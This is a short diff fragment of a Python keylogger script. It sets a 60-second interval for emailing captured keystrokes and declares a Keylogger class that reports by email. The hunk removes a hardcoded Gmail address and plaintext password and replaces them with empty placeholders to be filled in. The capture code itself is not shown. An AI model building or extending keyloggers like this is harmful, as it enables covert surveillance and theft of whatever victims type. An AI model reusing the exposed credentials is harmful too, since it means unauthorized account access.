@@ -10,13 +10,10 @@ from threading import Timer
 from datetime import datetime
 #a time interval variable to send email every 60 seconds on the keystrokes
 TIME_INTERVAL=60
-EMAIL_ADDRESS="experimentalacc26@gmail.com"
-#please don't use this email pls
-EMAIL_PASSWORD="expaccpass24"
+EMAIL_ADDRESS="" #add your email
 
-#this email is used for experimental purposes and a misuse of this email will
-#be punishable by law, nevertheless the password will be changed after my 
-#personal use
+EMAIL_PASSWORD="" #add its corresponding password
+
 
 class Keylogger:
      def __init__(self,interval,how_to_report="email"):
